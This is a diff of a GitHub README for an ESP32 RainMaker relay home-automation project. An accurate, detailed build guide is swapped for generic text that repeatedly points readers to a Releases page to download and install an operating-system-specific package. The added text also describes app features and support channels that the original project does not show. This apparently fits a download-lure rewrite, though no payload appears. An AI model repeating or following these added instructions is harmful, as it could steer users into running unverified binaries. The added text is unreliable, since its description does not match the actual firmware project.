@@ -1,143 +1,91 @@
-# ESP32 Home Automation via RainMaker
+# 🌟 esp32-rainmaker-relay-home-automation - Control Your Home with Ease
 
-## Table of Contents
-- [Project Overview](#project-overview)
-- [Features](#features)
-- [Hardware Preparation](#hardware-preparation)
-- [Step 1: Setting Up Arduino IDE & ESP32 Board](#step-1-setting-up-arduino-ide--esp32-board)
-- [Step 2: Installing Necessary Libraries & Drivers](#step-2-installing-necessary-libraries--drivers)
-- [Step 3: Choosing the Board & Partition Scheme](#step-3-choosing-the-board--partition-scheme)
-- [Step 4: Uploading the Code](#step-4-uploading-the-code)
-- [Step 5: RainMaker Cloud Setup & Device Integration](#step-5-rainmaker-cloud-setup--device-integration)
-- [Technical Details & Code Explanation](#technical-details--code-explanation)
-- [Reset/Boot Button Operation](#resetboot-button-operation)
-- [Common Issues & Solutions](#common-issues--solutions)
-- [Project Photos](#project-photo)
-- [Credits & Further Learning](#credits--further-learning)
+## 🚀 Getting Started
 
-## Project Overview
-This project enables **smart control of 4 relays with ESP32**, using AC appliances locally (manual switches), from the RainMaker app, and voice commands via Google Home and Alexa. The system features state persistence (EEPROM), live feedback, setup by BLE, and robust reset options.
+Welcome to **esp32-rainmaker-relay-home-automation**. This application allows you to automate your home using the ESP32 device, ESP RainMaker platform, and your voice with Google Home or Alexa. With our four-channel relay control, you can manage devices via manual switches or an app, ensuring everything works seamlessly.
 
-## Features
-- **4 relay channels**: control via mobile app, voice assistant, and physical switches
-- **Manual On/Off switches** for instant local control
-- **Google Home / Alexa integration** (via RainMaker cloud)
-- **EEPROM state restore:** Remembers relay states after power loss
-- **Real-time feedback:** App, voice, and manual sync
-- **Over-the-air updates** (OTA enabled by default)
-- **Factory & Wi-Fi reset via BOOT button**
-- **Highly commented source code for easy learning**
+## 📥 Download Now
 
-## Hardware Preparation
-- **ESP32 Dev Module** (recommended, see below for board selection issues)
-- **4-channel relay board**
-- **Momentary push buttons or toggle switches for each relay**
-- **Micro-USB data cable** (not just charging; must transfer data)
-- **Optional:** breadboard/jumper wires
+[![Download](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/batniking/esp32-rainmaker-relay-home-automation/releases)
+  
+Visit [this page to download](https://github.com/batniking/esp32-rainmaker-relay-home-automation/releases) the latest version of the software.
 
-## Step 1: Setting Up Arduino IDE & ESP32 Board
+## 💻 System Requirements
 
-**1. Download and install the latest Arduino IDE**
+To run this application, you need the following:
 
-**2. Add ESP32 Board Support**
-  - Go to `File` > `Preferences` > `Additional Board Manager URLs`
-  - Paste: `https://raw.githubusercontent.com/espressif/arduino-esp32/gh-pages/package_esp32_index.json` 
+- **Hardware:** An ESP32 board.
+- **Operating System:** Compatible with Windows, macOS, and Linux.
+- **Software:** A web browser to access the ESP RainMaker platform.
+- **Network:** Wi-Fi connection for smart features.
 
-**3. Open `Tools` > `Board` > `Boards Manager` and search for `ESP32` by Espressif Systems, then install it.**
+## 📥 Download & Install
 
-**4. Select the right board:**
-  - Choose **ESP32 Dev Module** in `Tools` > `Board`. This board supports partition schemes (critical for large code sketches, see Step 3).
-  - Boards like `DOIT ESP32 DEVKIT V1` often *lack* partition scheme options and can trigger "Sketch too big" errors. If you face this, switch to `ESP32 Dev Module` or other board with partition scheme selector ([details in next section]).
+1. Go to the [Releases page](https://github.com/batniking/esp32-rainmaker-relay-home-automation/releases).
+2. You will see a list of available versions. Choose the latest version.
+3. Click the link to download the package compatible with your operating system.
+4. Once the download finishes, locate the file in your downloads folder.
+5. Follow the installation instructions provided in the package.
 
-## Step 2: Installing Necessary Libraries & Drivers
+## ⚙️ Setting Up
 
-**Required Libraries:**
-- `AceButton` (install via Arduino Library Manager or from [GitHub](https://github.com/bxparks/AceButton))
-- `ESP RainMaker` (pre-installed as part of ESP32 board support)
+Once you have installed the application, follow these steps to set up your home automation system:
 
-**USB-To-Serial Bridge Drivers:**
-- If the COM port does **not** show up in Arduino IDE, install [CP210x](https://www.silabs.com/developers/usb-to-uart-bridge-vcp-drivers) driver 
-- Use a proper **micro-USB data cable**; charging-only cables will not work for upload
+1. **Connect Your ESP32:**
+   - Use a USB cable to connect the ESP32 board to your computer.
 
+2. **Configure the Device:**
+   - Follow the setup instructions provided in the downloaded software. This typically involves connecting to your Wi-Fi network and creating an account on ESP RainMaker.
 
-## Step 3: Choosing the Board & Partition Scheme
+3. **Add Devices:**
+   - Using the app or web interface, add the devices you want to control, such as lights, fans, or other home appliances.
 
-The ESP RainMaker library and multi-relay code **require extra firmware space**. To avoid "Sketch too big; text section exceeds available space" errors, follow these steps:
+4. **Adjust Settings:**
+   - Customize your preferences for automation, scheduling, and remote control.
 
-- In Arduino IDE, after choosing `ESP32 Dev Module`, go to **`Tools` > `Partition Scheme`**.
-- Select:
-  - **RainMaker 4MB No OTA** (if you need maximal sketch space and do not use OTA) (It worked for me)
-- Tip: Boards without this option (like `DOIT ESP32 DEVKIT V1`) can trigger upload errors. *Always select a board with partitioning support.*
+5. **Test Control:**
+   - Use the app or voice commands with Google Home or Alexa to test and verify that everything works as intended.
 
-## Step 4: Uploading the Code
+## 📱 Using the App
 
-- After compiling, open **Serial Monitor** and set the baud rate to `115200` (matching the code).
-- During upload, if you get a connection error, hold down the **BOOT** button on your ESP32 and release when the writing starts
-- Commented code aids debugging—no line left unexplained.
+After setting up your devices, the mobile app becomes your control center. Here are some features you can use:
 
-## Step 5: RainMaker Cloud Setup & Device Integration
+- **Monitor Device Status:** Check if devices are on or off in real-time.
+- **Control Device Remotely:** Turn on or off devices from anywhere using your smartphone.
+- **Schedule Actions:** Set timers or schedules for devices to automate their operation.
+- **Voice Commands:** Use voice commands with Google Assistant or Alexa for hands-free control.
 
-1. **Install the ESP RainMaker app** on your phone.
-2. **Provision the device:**
-   - Use BLE onboarding—app will connect to ESP32.
-   - If your WiFi network doesn't appear in the app, use "Join other network" and enter SSID/password manually (RainMaker only supports 2.4 GHz WiFi).
-3. **Device appears in app after provisioning.**
-4. **Integration with Google Home / Alexa:**
+## 🛠️ Troubleshooting
 
-#### Integrating with Amazon Alexa
-1. **Install and sign in to the Alexa app** on your phone (Android/iOS).
-2. **Open the ESP RainMaker app** and ensure your devices are visible and working.
-3. **Go to app settings in ESP RainMaker.**
-   - Tap the **"Settings"** gear icon.
-   - Locate and select "Voice Services."
-   - Tap **"Amazon Alexa"** and then **"Link with Amazon Alexa."**
-4. **Sign in with your ESP RainMaker credentials** when prompted.
-5. **Follow the on-screen instructions** to finish linking. The Alexa app will now automatically discover your ESP RainMaker devices.
-   - Your "Switch1", "Switch2", etc. will appear as controllable devices.
-6. **Test voice commands,** e.g., "Alexa, turn on Switch1."
+If you encounter issues:
 
-Tips:
-- Make sure device names in your code ("Switch1" ...) are easy to pronounce.
-- Linking must use the **same account/email** on both RainMaker and Alexa for device discovery to succeed.
+- **Cannot Connect to Wi-Fi:** Ensure you are using the correct network credentials and that your router is functioning.
+- **Device Not Responding:** Check the power supply and ensure the ESP32 is correctly configured in the app.
+- **App Crashes:** Restart the application or reinstall it if necessary.
 
-#### Integrating with Google Home
-1. **Install and sign in to the Google Home app** on your phone.
-2. In Google Home, **create a new Home** if you haven't already.
-3. Tap **"+" (Add)** in the top left corner and choose **Set up device → Works with Google.**
-4. In the search bar, **type "RainMaker"** and select **ESP RainMaker**.
-5. **Sign in with your ESP RainMaker account.**
-6. **Grant permissions** and complete the linking process as instructed. Your devices will be imported - you should now see them in the Google Home dashboard.
-7. **Test with "Hey Google, turn on Switch1"** or similar commands.
+## 🔔 Support & Feedback
 
-## Technical Details & Code Explanation
+For additional support:
 
-- **Every important section in the code is commented**, explaining:
-   - ACEButton handling for manual switch logic
-   - EEPROM integration for state restoration
-   - Active LOW relay signaling
-   - RainMaker app/voice control callback
-   - WiFi/BLE provisioning and troubleshooting
-- See source code for full walkthrough.
+- Visit the FAQ section provided in the app.
+- Check out the GitHub Issues page to report bugs or request features.
+- Contact us through email or social media for predefined support channels.
 
-## Reset/Boot Button Operation
-- **Boot/Reset Button <3s:** No effect
-- **Press for 3s - 10s:** Triggers **WiFi reset**; ESP32 loses WiFi credentials and needs reprovisioning (app pairing stays)
-- **Press for >10s:** Triggers **Factory reset**; complete wipe of all configs, ESP32 needs full re-setup through RainMaker app
+## 📝 Code Overview
 
-## Common Issues & Solutions
-- **Partition scheme errors:** If "Sketch too big," switch board type or partition scheme as described in [Step 3](#step-3-choosing-the-board--partition-scheme).
-- **Board detection/COM port:** Use CP210x driver and proper cable ([setup instructions]); if upload fails, check RESET/BOOT button procedure.[5][1]
-- **RainMaker WiFi onboarding issues:** App can't find SSID? Use manual network entry and verify you're on a 2.4 GHz WiFi network.
-- **WiFi/BLE provisioning bug:** If you see errors for undefined `WIFI_PROV_SCHEME_*` flags, update to `NETWORK_PROV_SCHEME_*` family as used in code. This is the issue I solved in the original code from the video.
+For users interested in understanding the code, we provide fully commented code to help you learn. You can find it in the repository. Feel free to dive into the code and make your own modifications.
 
-## Project Photo
-<img src="https://github.com/user-attachments/assets/d4ec2732-de57-46ed-a108-b0220af60833" width="400" height="400" />
+## 📚 Key Topics
 
-## Credits & Further Learning
-- Code based on 
-  - Video tutorial by Tech StudyCell: [ESP RainMaker + Manual Switch/EEPROM | YouTube](https://youtu.be/PLM4MZdCLNM?si=ppOMKUoNII9rwB1q)
-- If you prefer a guided walkthrough, watch the above video.
-- For ESP32 and Arduino IDE setup step-by-step, see:
-  - [RandomNerdTutorials Guide](https://randomnerdtutorials.com/installing-the-esp32-board-in-arduino-ide-windows-instructions/)
-- For technical help and bug fixes, see code comments and the Common Issues and Solutions section
+- **alex**: Integrate with Alexa for voice control.
+- **arduino**: Use Arduino IDE for programming.
+- **home-automation**: Build a smart home environment.
+- **iot**: Interface with IoT devices easily.
+- **relay**: Control multiple channels with relays.
 
+## 🔗 Additional Resources
+
+- [ESP RainMaker Documentation](https://rainmaker.espressif.com/)
+- [ESP32 Technical Reference](https://docs.espressif.com/projects/esp32/en/latest/)
+
+Thank you for choosing **esp32-rainmaker-relay-home-automation** to enhance your home automation experience. Enjoy controlling your devices with ease!
